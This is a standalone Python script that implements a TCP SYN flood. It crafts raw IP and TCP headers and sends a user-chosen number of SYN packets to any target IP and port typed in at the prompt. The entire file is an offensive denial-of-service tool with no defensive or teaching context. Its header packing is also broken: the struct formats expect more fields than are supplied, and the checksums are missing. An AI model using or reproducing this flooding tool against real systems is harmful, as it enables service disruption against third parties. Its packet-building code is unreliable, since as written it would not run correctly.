import socket
import struct

def syn_flood(target, port, num_packets=1000):
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        for _ in range(num_packets):
            packet = create_syn_packet(target, port)
            try:
                sock.sendto(packet, (target, port))
            except socket.error as e:
                print(f"Error sending packet: {e}")

def create_syn_packet(target, port):
    ip_header = create_ip_header(target)
    tcp_header = create_tcp_header(port)
    packet = ip_header + tcp_header
    return packet

def create_ip_header(target):
    ip_version = 4
    ip_ihl = 5
    ip_tos = 0
    ip_tot_len = 20 + 20
    ip_id = 0
    ip_flags = 0x00
    ip_frag_off = 0
    ip_ttl = 64
    ip_protocol = socket.IPPROTO_TCP
    ip_src = socket.inet_aton("127.0.0.1")
    ip_dst = socket.inet_aton(target)
    ip_header = struct.pack("!BBHHHBBH4s4s", ip_version << 4 | ip_ihl, ip_tos, ip_tot_len, ip_id, ip_flags, ip_ttl, ip_protocol, ip_src, ip_dst)
    return ip_header

def create_tcp_header(port):
    tcp_src_port = 443
    tcp_dst_port = port
    tcp_seq = 0
    tcp_ack = 0
    tcp_data_off = 5
    tcp_flags = 0x02
    tcp_window = 65535
    tcp_urg_ptr = 0
    tcp_header = struct.pack("!HHLLBBHHH", tcp_src_port, tcp_dst_port, tcp_seq, tcp_ack, tcp_data_off, tcp_flags, tcp_window, tcp_urg_ptr)
    return tcp_header

if __name__ == "__main__":
    target = input("Enter target IP address: ")
    port = int(input("Enter target port: "))
    num_packets = int(input("Enter number of packets to send: "))
    syn_flood(target, port, num_packets)
